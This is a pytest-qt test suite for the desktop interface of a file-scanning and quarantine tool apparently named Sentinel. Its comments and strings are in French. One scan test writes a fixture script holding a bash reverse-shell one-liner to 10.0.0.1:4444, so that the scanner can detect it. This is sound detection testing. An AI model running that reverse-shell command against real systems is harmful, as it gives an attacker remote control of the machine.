"""Interface bureau (pytest-qt, offscreen).

unittest discover importe ce module. Sans PySide6, aucune fonction de
test n'est définie : la suite cœur reste verte. La CI GUI lance
``pytest tests/test_gui.py`` avec ``QT_QPA_PLATFORM=offscreen``.
"""

from __future__ import annotations

import os
import sys
from pathlib import Path

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

try:
    import pytest
    from PySide6.QtCore import QSettings

    from sentinel.gui.app import MainWindow
except ImportError:  # PySide6 ou pytest absent : la suite cœur n'en a pas besoin
    pytest = None  # type: ignore[assignment]


if pytest is not None:

    @pytest.fixture
    def window(qtbot, tmp_path, monkeypatch):
        monkeypatch.setattr(
            "sentinel.gui.app.data_dir",
            lambda: tmp_path / "state",
        )
        settings = QSettings(str(tmp_path / "settings.ini"), QSettings.Format.IniFormat)
        host = MainWindow(settings=settings)
        qtbot.addWidget(host)
        host.show()
        return host

    def test_window_opens(window) -> None:
        assert window.windowTitle().startswith("Sentinel")
        assert window.stack.count() == 5
        window._show(1)
        assert window.stack.currentWidget() is window.scan

    def test_scan_filter_and_export(window, qtbot, tmp_path) -> None:
        folder = tmp_path / "tree"
        folder.mkdir()
        (folder / "evil.sh").write_text(
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n", encoding="utf-8"
        )
        window.scan.paths.clear()
        window.scan.paths.addItem(str(folder))
        window.scan.severity.setCurrentText("low")
        window.scan.start_scan(folder)
        qtbot.waitUntil(lambda: window.scan.state in {"done", "error", "cancelled"}, timeout=30000)
        assert window.scan.state == "done", window.scan.progress.text()
        rules = [
            window.scan.model.item(row, 1).text() for row in range(window.scan.model.rowCount())
        ]
        assert "SIG-0002" in rules

        window.scan.filter.setText("SIG-0002")
        assert window.scan.proxy.rowCount() >= 1
        window.scan.filter.setText("aucun-resultat-xyz")
        assert window.scan.proxy.rowCount() == 0

        sarif = tmp_path / "out.sarif"
        window.scan.export_to(sarif, "sarif")
        assert "$schema" in sarif.read_text(encoding="utf-8")
        exported = tmp_path / "out.json"
        window.scan.export_to(exported, "json")
        assert "SIG-0002" in exported.read_text(encoding="utf-8")

        state = tmp_path / "state" / "last_scan.json"
        assert state.is_file()
        window.refresh_dashboard()
        assert "finding" in window.dashboard.scan_label.text()

    def test_cancel_does_not_fill_the_table(window, qtbot, tmp_path) -> None:
        from sentinel.platform import OperationCancelled

        def runner(cancel, progress):
            progress("evil.sh", 1, 2)
            cancel()
            raise OperationCancelled("stop")

        folder = tmp_path / "tree"
        folder.mkdir()
        window.scan.start_scan(folder, runner=runner)
        qtbot.waitUntil(lambda: window.scan.state == "cancelled", timeout=10000)
        assert window.scan.model.rowCount() == 0
        assert window.scan.run_btn.isEnabled()

    def test_resign_requires_trust_then_signs(window, tmp_path) -> None:
        from sentinel.gui.services import create_baseline

        folder = tmp_path / "tree"
        folder.mkdir()
        (folder / "a.txt").write_text("ok\n", encoding="utf-8")
        out = tmp_path / "base.json"
        create_baseline(folder, out, None)
        window.keys.set("secret-key")
        window.baseline.folder.setText(str(folder))
        window.baseline.out.setText(str(out))
        window.baseline.trust.setChecked(False)
        window.baseline._resign()
        assert "trust-unsigned" in window.baseline.status.text()
        assert "signature" not in out.read_text(encoding="utf-8")

        window.baseline.trust.setChecked(True)

        def accept_dialog() -> None:
            from PySide6.QtWidgets import QApplication, QMessageBox

            box = QApplication.activeModalWidget()
            assert box is not None
            assert "Écarts" in box.informativeText()
            box.button(QMessageBox.StandardButton.Yes).click()

        from PySide6.QtCore import QTimer

        QTimer.singleShot(0, accept_dialog)
        window.baseline._resign()
        text = out.read_text(encoding="utf-8")
        assert "signature" in text
        assert "resigned_from_unsigned" in text
        window.refresh_dashboard()
        assert "oui" in window.dashboard.base_label.text()

    def test_quarantine_list_and_restore(window, tmp_path) -> None:
        from sentinel.gui.services import quarantine

        src_dir = tmp_path / "docs"
        src_dir.mkdir()
        src = src_dir / "note.txt"
        src.write_text("hello quarantine\n", encoding="utf-8")
        dest = tmp_path / "q"
        records, failures = quarantine([src], dest, dest / "manifest.jsonl")
        assert records and not failures
        assert not src.exists()
        window.quarantine.dest.setText(str(dest))
        window.quarantine.reload()
        assert window.quarantine.model.rowCount() >= 1
        restored, failed = window.quarantine.restore_without_dialog(None)
        assert restored == 1
        assert failed == 0
        assert src.is_file()
        assert src.read_text(encoding="utf-8") == "hello quarantine\n"

    def test_integrity_changes_are_listed(window, tmp_path, qtbot) -> None:
        from sentinel.gui.services import create_baseline

        folder = tmp_path / "tree"
        folder.mkdir()
        target = folder / "a.txt"
        target.write_text("avant\n", encoding="utf-8")
        out = tmp_path / "base.json"
        create_baseline(folder, out, None)
        target.write_text("apres\n", encoding="utf-8")
        window.scan.paths.clear()
        window.scan.paths.addItem(str(folder))
        window.scan.baseline.setText(str(out))
        window.scan.start_scan(folder)
        qtbot.waitUntil(lambda: window.scan.state == "done", timeout=10000)
        text = window.scan.progress.text()
        assert "non signée" in text
        assert "a.txt" in text
        assert "modifiés" in text
        assert window.scan.model.rowCount() >= 1

    def test_trust_resets_when_signed_state_changes(window, tmp_path) -> None:
        window.baseline.trust.setChecked(True)
        window.baseline._sync_trust(True)
        assert not window.baseline.trust.isChecked()
        assert not window.baseline.trust.isEnabled()
        window.baseline._sync_trust(False)
        assert not window.baseline.trust.isChecked()
        assert window.baseline.trust.isEnabled()

    def test_watch_failure_reenables_start(window, tmp_path) -> None:
        window.watch.folder.setText(str(tmp_path))
        window.watch.interval.setText("0")
        window.watch.start()
        assert window.watch.start_btn.isEnabled()
        window.watch.interval.setText("2")
        window.watch.start_btn.setEnabled(False)
        window.watch._on_failed("boom")
        assert window.watch.start_btn.isEnabled()
        assert "boom" in window.watch.log.toPlainText()

    def test_default_quarantine_is_not_the_cwd(window, tmp_path) -> None:
        assert window.quarantine.dest.text() == str(tmp_path / "state" / "quarantine")

    def test_key_is_not_written_to_settings(window) -> None:
        window.keys.set("super-secret-key-value")
        window.settings.setValue("baseline_path", "baseline.json")
        window.settings.sync()
        raw = Path(window.settings.fileName()).read_text(encoding="utf-8", errors="replace")
        assert "super-secret-key-value" not in raw
        assert window.keys.value == "super-secret-key-value"

    def test_missing_tray_does_not_crash(window) -> None:
        window.close()
        assert window.watch_status_text().startswith("Surveillance")

    def test_unc_classification_stays_off_the_gui_thread(
        window, qtbot, monkeypatch, tmp_path
    ) -> None:
        import threading

        seen: list[threading.Thread] = []

        def note(path: Path) -> None:
            del path
            seen.append(threading.current_thread())
            return None

        def put(paths, dest, manifest, force=False):
            del paths, dest, manifest, force
            seen.append(threading.current_thread())
            return [], []

        monkeypatch.setattr("sentinel.gui.workers.sensitive_scan_note", note)
        monkeypatch.setattr("sentinel.gui.workers.quarantine", put)
        gui = threading.current_thread()
        folder = tmp_path / "scan-me"
        folder.mkdir()
        before = window.scan.paths.count()
        window.scan.consider_folder(folder)
        qtbot.waitUntil(lambda: window.scan.paths.count() == before + 1, timeout=5000)
        assert seen and seen[-1] is not gui

        seen.clear()
        src = tmp_path / "note.txt"
        src.write_text("x", encoding="utf-8")
        window.quarantine.dest.setText(str(tmp_path / "q"))
        window.quarantine.quarantine_files([src])
        qtbot.waitUntil(lambda: len(seen) >= 2, timeout=5000)
        qtbot.waitUntil(
            lambda: "Déplacés" in window.quarantine.log.toPlainText(),
            timeout=5000,
        )
        assert all(thread is not gui for thread in seen)

    def test_second_note_drops_the_stale_result(window, qtbot, monkeypatch, tmp_path) -> None:
        import threading

        from PySide6.QtWidgets import QMessageBox

        gates = {"old": threading.Event(), "new": threading.Event()}
        dialogs: list[str] = []

        def note(path: Path) -> str | None:
            gates[path.name].wait(3)
            if path.name == "old":
                return "chemin critique"
            return None

        def information(*args: object, **_kwargs: object) -> None:
            dialogs.append(str(args[-1]) if args else "")

        monkeypatch.setattr("sentinel.gui.workers.sensitive_scan_note", note)
        monkeypatch.setattr(QMessageBox, "information", information)
        old = tmp_path / "old"
        new = tmp_path / "new"
        old.mkdir()
        new.mkdir()
        before = window.scan.paths.count()
        window.scan.consider_folder(old)
        window.scan.consider_folder(new)
        gates["new"].set()
        qtbot.waitUntil(lambda: window.scan.paths.count() == before + 1, timeout=5000)
        assert window.scan.paths.item(before).text() == str(new)
        gates["old"].set()
        qtbot.wait(200)
        assert window.scan.paths.count() == before + 1
        assert dialogs == []

    def test_second_quarantine_click_is_visible(window, qtbot, monkeypatch, tmp_path) -> None:
        import threading

        from PySide6.QtWidgets import QMessageBox

        started = threading.Event()
        release = threading.Event()
        dialogs: list[str] = []

        def slow(*_args: object, **_kwargs: object) -> tuple[list[object], list[object]]:
            started.set()
            release.wait(3)
            return [], []

        def information(*args: object, **_kwargs: object) -> None:
            dialogs.append(str(args[-1]) if args else "")

        monkeypatch.setattr("sentinel.gui.workers.sensitive_scan_note", lambda _path: None)
        monkeypatch.setattr("sentinel.gui.workers.quarantine", slow)
        monkeypatch.setattr(QMessageBox, "information", information)
        src = tmp_path / "a.txt"
        src.write_text("x", encoding="utf-8")
        window.quarantine.dest.setText(str(tmp_path / "q"))
        window.quarantine.quarantine_files([src])
        qtbot.waitUntil(started.is_set, timeout=5000)
        window.quarantine.quarantine_files([src])
        assert dialogs
        assert "déjà en cours" in dialogs[-1]
        assert "déjà en cours" in window.quarantine.log.toPlainText()
        release.set()
        qtbot.waitUntil(lambda: "Déplacés" in window.quarantine.log.toPlainText(), timeout=5000)

    def test_restore_is_blocked_while_quarantine_runs(window, qtbot, monkeypatch, tmp_path) -> None:
        import threading

        from PySide6.QtWidgets import QMessageBox

        started = threading.Event()
        release = threading.Event()
        dialogs: list[str] = []

        def slow(*_args: object, **_kwargs: object) -> tuple[list[object], list[object]]:
            started.set()
            release.wait(3)
            return [], []

        def information(*args: object, **_kwargs: object) -> None:
            dialogs.append(str(args[-1]) if args else "")

        def question(*_args: object, **_kwargs: object) -> None:
            raise AssertionError("la restauration ne doit pas demander confirmation")

        monkeypatch.setattr("sentinel.gui.workers.sensitive_scan_note", lambda _path: None)
        monkeypatch.setattr("sentinel.gui.workers.quarantine", slow)
        monkeypatch.setattr(QMessageBox, "information", information)
        monkeypatch.setattr(QMessageBox, "question", question)
        src = tmp_path / "a.txt"
        src.write_text("x", encoding="utf-8")
        window.quarantine.dest.setText(str(tmp_path / "q"))
        window.quarantine.quarantine_files([src])
        qtbot.waitUntil(started.is_set, timeout=5000)
        window.quarantine.restore_selected()
        assert dialogs
        assert "déjà en cours" in dialogs[-1]
        assert "restaurer" in dialogs[-1]
        assert "déjà en cours" in window.quarantine.log.toPlainText()
        assert window.quarantine.restore_without_dialog(None) == (0, 1)
        release.set()
        qtbot.waitUntil(lambda: "Déplacés" in window.quarantine.log.toPlainText(), timeout=5000)

    def test_close_during_quarantine_waits_and_finishes_the_move(
        window, qtbot, monkeypatch, tmp_path
    ) -> None:
        import threading

        from PySide6.QtWidgets import QMessageBox

        from sentinel.gui.services import quarantine as real_quarantine

        started = threading.Event()
        release = threading.Event()
        note_gate = threading.Event()
        warnings: list[str] = []

        def slow(paths, dest, manifest, force=False):
            started.set()
            release.wait(5)
            return real_quarantine(paths, dest, manifest, force=force)

        def note(path: Path) -> None:
            if path.name == "later":
                note_gate.wait(5)
            return None

        def warning(*args: object, **_kwargs: object) -> None:
            warnings.append(str(args[-1]) if args else "")

        monkeypatch.setattr("sentinel.gui.workers.sensitive_scan_note", note)
        monkeypatch.setattr("sentinel.gui.workers.quarantine", slow)
        monkeypatch.setattr(QMessageBox, "warning", warning)
        monkeypatch.setattr(QMessageBox, "information", lambda *_a, **_k: None)
        src_dir = tmp_path / "inbox"
        src_dir.mkdir()
        src = src_dir / "move-me.txt"
        src.write_text("kept\n", encoding="utf-8")
        dest = tmp_path / "kept"
        window.quarantine.dest.setText(str(dest))
        later = tmp_path / "later"
        later.mkdir()
        before = window.scan.paths.count()
        window.scan.consider_folder(later)
        window.quarantine.quarantine_files([src])
        qtbot.waitUntil(started.is_set, timeout=5000)
        window.close()
        assert window.isVisible()
        assert warnings
        assert "déplacement" in warnings[-1]
        assert src.is_file()
        release.set()
        qtbot.waitUntil(lambda: not src.exists(), timeout=5000)
        assert any(path.is_file() for path in dest.iterdir())
        qtbot.waitUntil(
            lambda: "Déplacés" in window.quarantine.log.toPlainText(),
            timeout=5000,
        )

        def open_gate() -> None:
            note_gate.set()

        threading.Timer(0.1, open_gate).start()
        window._tray = None
        window.close()
        assert window.scan.paths.count() == before
        qtbot.wait(400)
        assert window.scan.paths.count() == before

    def test_tray_hide_does_not_wait_or_drop_the_folder(
        window, qtbot, monkeypatch, tmp_path
    ) -> None:
        import threading
        import time

        gate = threading.Event()
        started = threading.Event()

        def note(path: Path) -> None:
            del path
            started.set()
            gate.wait(5)
            return None

        monkeypatch.setattr("sentinel.gui.workers.sensitive_scan_note", note)
        if window._tray is None:
            window._tray = object()
        folder = tmp_path / "kept-visible"
        folder.mkdir()
        before = window.scan.paths.count()
        window.show()
        window.scan.consider_folder(folder)
        qtbot.waitUntil(started.is_set, timeout=5000)
        began = time.monotonic()
        window.close()
        assert time.monotonic() - began < 1.0
        assert not window.isVisible()
        assert window.scan.paths.count() == before
        gate.set()
        qtbot.waitUntil(lambda: window.scan.paths.count() == before + 1, timeout=5000)

    def test_stuck_note_exits_within_three_seconds(window, qtbot, monkeypatch, tmp_path) -> None:
        import threading
        import time

        from PySide6.QtCore import QTimer
        from PySide6.QtWidgets import QApplication

        from sentinel.gui.app import _background_threads
        from sentinel.gui.workers import PathNoteThread

        gate = threading.Event()
        started = threading.Event()
        exited = {"code": None}

        def note(path: Path) -> str | None:
            del path
            started.set()
            gate.wait(30)
            return None

        def fake_exit(code: int = 0) -> None:
            exited["code"] = code

        monkeypatch.setattr("sentinel.gui.workers.sensitive_scan_note", note)
        monkeypatch.setattr("sentinel.gui.app.os._exit", fake_exit)
        folder = tmp_path / "stuck-note"
        folder.mkdir()
        window.scan.consider_folder(folder)
        qtbot.waitUntil(started.is_set, timeout=5000)
        app = QApplication.instance()
        assert isinstance(app, QApplication)
        QTimer.singleShot(0, app.exit)
        began = time.monotonic()
        app.exec()
        elapsed = time.monotonic() - began
        assert elapsed < 3.5
        assert exited["code"] == 0
        stuck = [thread for thread in _background_threads if isinstance(thread, PathNoteThread)]
        assert stuck and stuck[0].isRunning()
        gate.set()
        assert stuck[0].wait(5000)

    def test_stuck_quarantine_stays_responsive_until_the_move_ends(
        window, qtbot, monkeypatch, tmp_path
    ) -> None:
        import threading

        from PySide6.QtCore import QTimer
        from PySide6.QtWidgets import QApplication, QMessageBox, QPushButton

        from sentinel.gui.app import _SHUTDOWN_TEXT, request_graceful_quit

        gate = threading.Event()
        started = threading.Event()
        ticks = {"n": 0}
        quits = {"n": 0}
        questions: list[str] = []

        def slow(paths, dest, manifest, force=False):
            del paths, dest, manifest, force
            started.set()
            gate.wait(30)
            return [], []

        def question(*args, **kwargs):
            del kwargs
            text = args[2] if len(args) > 2 else ""
            questions.append(str(text))
            return QMessageBox.StandardButton.No

        monkeypatch.setattr("sentinel.gui.workers.quarantine", slow)
        monkeypatch.setattr(QMessageBox, "question", question)
        monkeypatch.setattr(
            "sentinel.gui.app._quit_application",
            lambda: quits.__setitem__("n", quits["n"] + 1),
        )
        src_dir = tmp_path / "inbox"
        src_dir.mkdir()
        src = src_dir / "move-me.txt"
        src.write_text("kept\n", encoding="utf-8")
        window.quarantine.dest.setText(str(tmp_path / "kept"))
        window.quarantine.quarantine_files([src])
        qtbot.waitUntil(started.is_set, timeout=5000)
        timer = QTimer()
        timer.timeout.connect(lambda: ticks.__setitem__("n", ticks["n"] + 1))
        timer.start(30)
        request_graceful_quit()
        qtbot.waitUntil(lambda: ticks["n"] >= 3, timeout=2000)
        dialog = QApplication.activeModalWidget()
        assert dialog is not None
        assert dialog.windowTitle() == _SHUTDOWN_TEXT
        assert quits["n"] == 0
        request_graceful_quit()
        assert questions
        assert "moitié" in questions[-1]
        assert quits["n"] == 0
        gate.set()
        thread = window.quarantine._put_thread
        assert thread is not None
        qtbot.waitUntil(lambda: quits["n"] == 1, timeout=5000)
        qtbot.waitUntil(lambda: not dialog.isVisible(), timeout=2000)
        assert thread.wait(5000)
        timer.stop()

    def test_forced_exit_flushes_the_journal_line(window, qtbot, monkeypatch, tmp_path) -> None:
        import logging
        import os
        import sys
        import threading

        from PySide6.QtWidgets import QApplication, QMessageBox, QPushButton

        from sentinel.gui.app import _SHUTDOWN_TEXT, request_graceful_quit
        from sentinel.quarantine import _journal_file, _journal_lock, flush_quarantine_journals

        def read_fd(path: Path) -> bytes:
            fd = os.open(path, os.O_RDONLY)
            try:
                return os.read(fd, 65536)
            finally:
                os.close(fd)

        gate = threading.Event()
        started = threading.Event()
        order: list[str] = []
        exited = {"code": None}
        root = logging.getLogger()
        saved_handlers = list(root.handlers)

        def slow(paths, dest, manifest, force=False):
            del paths, dest, manifest, force
            started.set()
            gate.wait(30)
            return [], []

        def question(*_args, **_kwargs):
            return QMessageBox.StandardButton.Yes

        def fake_exit(code: int = 0) -> None:
            order.append("exit")
            exited["code"] = code

        journal = tmp_path / "journal" / "quarantine.jsonl"
        payload = b'{"path":"C:\\\\Users\\\\alice\\\\notes.txt"}\n'

        def flushing() -> None:
            order.append("journal")
            flush_quarantine_journals()

        real_sync = window.settings.sync

        def sync() -> None:
            order.append("settings")
            real_sync()

        real_shutdown = logging.shutdown

        def shutdown() -> None:
            order.append("logging")
            real_shutdown()

        class _FlushProxy:
            def __init__(self, underlying: object, label: str) -> None:
                self._underlying = underlying
                self._label = label

            def flush(self) -> None:
                order.append(self._label)
                self._underlying.flush()  # type: ignore[attr-defined]

            def write(self, data: str) -> int:
                return self._underlying.write(data)  # type: ignore[attr-defined, no-any-return]

            def __getattr__(self, name: str) -> object:
                return getattr(self._underlying, name)

        monkeypatch.setattr("sentinel.gui.workers.quarantine", slow)
        monkeypatch.setattr(QMessageBox, "question", question)
        monkeypatch.setattr("sentinel.gui.app.os._exit", fake_exit)
        monkeypatch.setattr("sentinel.gui.app.flush_quarantine_journals", flushing)
        monkeypatch.setattr(window.settings, "sync", sync)
        monkeypatch.setattr("sentinel.gui.app.logging.shutdown", shutdown)
        monkeypatch.setattr(sys, "stdout", _FlushProxy(sys.stdout, "stdout"))
        monkeypatch.setattr(sys, "stderr", _FlushProxy(sys.stderr, "stderr"))
        window.settings.setValue("exit_probe", "alice")
        try:
            with _journal_lock:
                handle = _journal_file(journal)
                handle.write(payload)
            assert payload not in read_fd(journal)

            src_dir = tmp_path / "inbox"
            src_dir.mkdir()
            src = src_dir / "move-me.txt"
            src.write_text("kept\n", encoding="utf-8")
            window.quarantine.dest.setText(str(tmp_path / "kept"))
            window.quarantine.quarantine_files([src])
            qtbot.waitUntil(started.is_set, timeout=5000)
            request_graceful_quit()

            def modal_ready() -> bool:
                dialog = QApplication.activeModalWidget()
                return dialog is not None and dialog.windowTitle() == _SHUTDOWN_TEXT

            qtbot.waitUntil(modal_ready, timeout=2000)
            dialog = QApplication.activeModalWidget()
            assert dialog is not None
            button = dialog.findChild(QPushButton)
            assert button is not None
            assert button.text() == "Forcer la fermeture"
            button.click()
            assert exited["code"] == 0
            assert order.index("journal") < order.index("settings")
            assert order.index("settings") < order.index("logging")
            after_log = order[order.index("logging") + 1 :]
            assert after_log[-3:] == ["stdout", "stderr", "exit"]
            assert payload in read_fd(journal)
        finally:
            gate.set()
            root.handlers[:] = saved_handlers
            thread = window.quarantine._put_thread
            if thread is not None and thread.isRunning():
                thread.wait(5000)

    def test_sigint_and_sigterm_request_a_graceful_quit(window, qtbot, monkeypatch) -> None:
        import signal

        called: list[str] = []
        previous_int = signal.getsignal(signal.SIGINT)
        previous_term = signal.getsignal(signal.SIGTERM) if os.name == "posix" else None
        monkeypatch.setattr(
            "sentinel.gui.app.request_graceful_quit",
            lambda *_args: called.append("quit"),
        )
        try:
            handler = signal.getsignal(signal.SIGINT)
            assert callable(handler)
            handler(signal.SIGINT, None)
            qtbot.waitUntil(lambda: called == ["quit"], timeout=2000)
            if os.name == "posix":
                term = signal.getsignal(signal.SIGTERM)
                assert callable(term)
                term(signal.SIGTERM, None)
                qtbot.waitUntil(lambda: called == ["quit", "quit"], timeout=2000)
        finally:
            signal.signal(signal.SIGINT, previous_int)
            if previous_term is not None:
                signal.signal(signal.SIGTERM, previous_term)

    def test_about_to_quit_finishes_the_quarantine_move(
        window, qtbot, monkeypatch, tmp_path
    ) -> None:
        """``app.exit`` / fin de session : pas d'``os._exit`` tant que le move tourne."""
        import threading
        import time

        from PySide6.QtCore import QTimer
        from PySide6.QtWidgets import QApplication

        from sentinel.gui import app as appmod
        from sentinel.gui.services import quarantine as real_quarantine

        gate = threading.Event()
        started = threading.Event()
        exited = {"code": None}
        seen = {"dialog": False, "exit_during": "unset"}

        def slow(paths, dest, manifest, force=False):
            started.set()
            gate.wait(30)
            return real_quarantine(paths, dest, manifest, force=force)

        def fake_exit(code: int = 0) -> None:
            exited["code"] = code

        def watch() -> None:
            deadline = time.monotonic() + 5
            while time.monotonic() < deadline:
                if appmod._shutdown_dialog is not None:
                    seen["dialog"] = True
                    seen["exit_during"] = exited["code"]
                    break
                time.sleep(0.02)
            gate.set()

        monkeypatch.setattr("sentinel.gui.workers.quarantine", slow)
        monkeypatch.setattr("sentinel.gui.app.os._exit", fake_exit)
        src_dir = tmp_path / "inbox"
        src_dir.mkdir()
        src = src_dir / "move-me.txt"
        src.write_bytes(b"kept\n")
        dest = tmp_path / "kept"
        window.quarantine.dest.setText(str(dest))
        window.quarantine.quarantine_files([src])
        qtbot.waitUntil(started.is_set, timeout=5000)
        threading.Thread(target=watch, daemon=True).start()
        app = QApplication.instance()
        assert isinstance(app, QApplication)
        try:
            QTimer.singleShot(0, app.exit)
            app.exec()
            assert seen["dialog"] is True
            assert seen["exit_during"] is None
            assert exited["code"] is None
            assert not src.exists()
            assert (dest / "move-me.txt").is_file()
            thread = window.quarantine._put_thread
            assert thread is not None
            assert thread.wait(5000)
            text = (dest / "manifest.jsonl").read_text(encoding="utf-8")
            assert '"done"' in text
            assert '"en cours"' in text
        finally:
            gate.set()

    def test_repeated_ctrl_c_focuses_the_open_confirmation(
        window, qtbot, monkeypatch, tmp_path
    ) -> None:
        import threading

        from PySide6.QtCore import QTimer
        from PySide6.QtWidgets import QApplication, QMessageBox

        from sentinel.gui.app import _SHUTDOWN_TEXT, request_graceful_quit

        gate = threading.Event()
        started = threading.Event()

        def slow(paths, dest, manifest, force=False):
            del paths, dest, manifest, force
            started.set()
            gate.wait(30)
            return [], []

        monkeypatch.setattr("sentinel.gui.workers.quarantine", slow)
        src_dir = tmp_path / "inbox"
        src_dir.mkdir()
        src = src_dir / "move-me.txt"
        src.write_text("kept\n", encoding="utf-8")
        window.quarantine.dest.setText(str(tmp_path / "kept"))
        window.quarantine.quarantine_files([src])
        qtbot.waitUntil(started.is_set, timeout=5000)
        counts: list[int] = []

        def during() -> None:
            def visible_boxes() -> list[QMessageBox]:
                return [
                    widget
                    for widget in QApplication.topLevelWidgets()
                    if isinstance(widget, QMessageBox) and widget.isVisible()
                ]

            counts.append(len(visible_boxes()))
            request_graceful_quit()
            counts.append(len(visible_boxes()))
            active = QApplication.activeModalWidget()
            assert isinstance(active, QMessageBox)
            button = active.button(QMessageBox.StandardButton.No)
            assert button is not None
            button.click()

        try:
            request_graceful_quit()

            def waiting_dialog_visible() -> bool:
                dialog = QApplication.activeModalWidget()
                return dialog is not None and dialog.windowTitle() == _SHUTDOWN_TEXT

            qtbot.waitUntil(waiting_dialog_visible, timeout=2000)
            QTimer.singleShot(0, during)
            request_graceful_quit()
            assert counts == [1, 1]
        finally:
            gate.set()
            thread = window.quarantine._put_thread
            if thread is not None:
                assert thread.wait(5000)

    def test_gui_startup_reports_incoherent_journal(qtbot, tmp_path, monkeypatch) -> None:
        import json

        from PySide6.QtCore import QSettings
        from PySide6.QtWidgets import QMessageBox

        from sentinel.gui.app import MainWindow
        from sentinel.quarantine import init_engine

        monkeypatch.setattr("sentinel.gui.app.data_dir", lambda: tmp_path / "state")
        manifest = tmp_path / "state" / "quarantine" / "manifest.jsonl"
        manifest.parent.mkdir(parents=True)
        original = tmp_path / "both.txt"
        original.write_text("x", encoding="utf-8")
        quarantined = manifest.parent / "both.txt"
        quarantined.write_text("x", encoding="utf-8")
        manifest.write_text(
            json.dumps(
                {
                    "id": "both",
                    "original": str(original),
                    "quarantined": str(quarantined),
                    "sha256": "abc",
                    "size": 1,
                    "_status": "en cours",
                }
            )
            + "\n",
            encoding="utf-8",
        )
        seen: list[str] = []

        def warning(*args: object, **_kwargs: object) -> None:
            seen.append(str(args[2]) if len(args) > 2 else "")

        monkeypatch.setattr(QMessageBox, "warning", warning)
        settings = QSettings(str(tmp_path / "settings.ini"), QSettings.Format.IniFormat)
        host = MainWindow(settings=settings)
        qtbot.addWidget(host)
        assert seen
        assert "Rien n'a été supprimé" in seen[0]
        assert "les deux emplacements existent" in seen[0]
        assert original.is_file()
        assert quarantined.is_file()
        rows = [json.loads(line) for line in manifest.read_text(encoding="utf-8").splitlines()]
        assert rows[-1]["_status"] == "incohérent"
        assert rows[-1]["_reason"] == "les deux emplacements existent"
        assert init_engine([manifest]) == []

    def _hold_manifest(manifest: Path, ready: Path, release: Path):
        import subprocess
        import textwrap

        script = textwrap.dedent(
            """
            import sys
            import time
            from pathlib import Path

            import sentinel.quarantine as quarantine

            manifest = Path(sys.argv[1])
            ready = Path(sys.argv[2])
            release = Path(sys.argv[3])
            manifest.parent.mkdir(parents=True, exist_ok=True)
            if not manifest.exists():
                manifest.write_text("", encoding="utf-8")
            with quarantine._journal_exclusive(manifest):
                ready.write_text("holding", encoding="utf-8")
                deadline = time.monotonic() + 30
                while not release.exists() and time.monotonic() < deadline:
                    time.sleep(0.02)
            """
        )
        env = os.environ.copy()
        previous = env.get("PYTHONPATH", "")
        env["PYTHONPATH"] = str(ROOT) + (os.pathsep + previous if previous else "")
        return subprocess.Popen(
            [sys.executable, "-c", script, str(manifest), str(ready), str(release)],
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

    def _wait_ready(proc, ready: Path) -> None:
        import time

        deadline = time.monotonic() + 10
        while not ready.exists():
            if proc.poll() is not None:
                _out, err = proc.communicate()
                raise AssertionError(err)
            if time.monotonic() > deadline:
                raise AssertionError("verrou non pris")
            time.sleep(0.02)

    def _stop_holder(proc, release: Path) -> None:
        release.write_text("go", encoding="utf-8")
        if proc.poll() is None:
            try:
                proc.wait(timeout=10)
            except Exception:
                proc.kill()
        if proc.poll() is None:
            proc.kill()
        proc.communicate()

    def test_startup_waits_for_the_journal_off_the_gui_thread(qtbot, tmp_path, monkeypatch) -> None:
        """Un autre processus qui déplace un fichier ne fige pas le thread Qt."""
        from PySide6.QtCore import QSettings, QTimer
        from PySide6.QtWidgets import QApplication, QLabel, QMessageBox

        from sentinel.gui.app import JOURNAL_WAIT_TEXT, MainWindow

        monkeypatch.setattr("sentinel.gui.app.data_dir", lambda: tmp_path / "state")
        monkeypatch.setattr("sentinel.quarantine.JOURNAL_LOCK_TIMEOUT", 3.0)
        manifest = tmp_path / "state" / "quarantine" / "manifest.jsonl"
        ready = tmp_path / "ready"
        release = tmp_path / "release"
        seen = {"dialog": False, "ticks": 0}
        warnings: list[str] = []

        def warning(*args: object, **_kwargs: object) -> None:
            warnings.append(str(args[2]) if len(args) > 2 else "")

        def indicator_visible() -> bool:
            widgets = list(QApplication.topLevelWidgets())
            active = QApplication.activeModalWidget()
            if active is not None:
                widgets.append(active)
            for widget in widgets:
                for label in widget.findChildren(QLabel):
                    if label.text() == JOURNAL_WAIT_TEXT and label.isVisible():
                        return True
            return False

        def poke() -> None:
            seen["ticks"] += 1
            if not indicator_visible():
                return
            seen["dialog"] = True
            seen["while_waiting"] = seen.get("while_waiting", 0) + 1
            if seen["while_waiting"] >= 2:
                release.write_text("go", encoding="utf-8")

        monkeypatch.setattr(QMessageBox, "warning", warning)
        proc = _hold_manifest(manifest, ready, release)
        timer = QTimer()
        timer.timeout.connect(poke)
        try:
            _wait_ready(proc, ready)
            timer.start(30)
            settings = QSettings(str(tmp_path / "settings.ini"), QSettings.Format.IniFormat)
            host = MainWindow(settings=settings)
            qtbot.addWidget(host)
        finally:
            timer.stop()
            _stop_holder(proc, release)
        assert seen["dialog"]
        assert seen["while_waiting"] >= 2
        assert warnings == []
        assert proc.returncode == 0

    def test_restore_waits_for_the_journal_off_the_gui_thread(
        window, qtbot, monkeypatch, tmp_path
    ) -> None:
        from PySide6.QtCore import QTimer
        from PySide6.QtWidgets import QApplication, QLabel

        from sentinel.gui.app import JOURNAL_WAIT_TEXT

        monkeypatch.setattr("sentinel.quarantine.JOURNAL_LOCK_TIMEOUT", 3.0)
        manifest = Path(window.quarantine.manifest.text())
        ready = tmp_path / "ready"
        release = tmp_path / "release"
        seen = {"dialog": False, "ticks": 0}

        def indicator_visible() -> bool:
            widgets = list(QApplication.topLevelWidgets())
            active = QApplication.activeModalWidget()
            if active is not None:
                widgets.append(active)
            for widget in widgets:
                for label in widget.findChildren(QLabel):
                    if label.text() == JOURNAL_WAIT_TEXT and label.isVisible():
                        return True
            return False

        def poke() -> None:
            seen["ticks"] += 1
            if not indicator_visible():
                return
            seen["dialog"] = True
            seen["while_waiting"] = seen.get("while_waiting", 0) + 1
            if seen["while_waiting"] >= 2:
                release.write_text("go", encoding="utf-8")

        proc = _hold_manifest(manifest, ready, release)
        timer = QTimer()
        timer.timeout.connect(poke)
        try:
            _wait_ready(proc, ready)
            timer.start(30)
            restored, failed = window.quarantine.restore_without_dialog()
        finally:
            timer.stop()
            _stop_holder(proc, release)
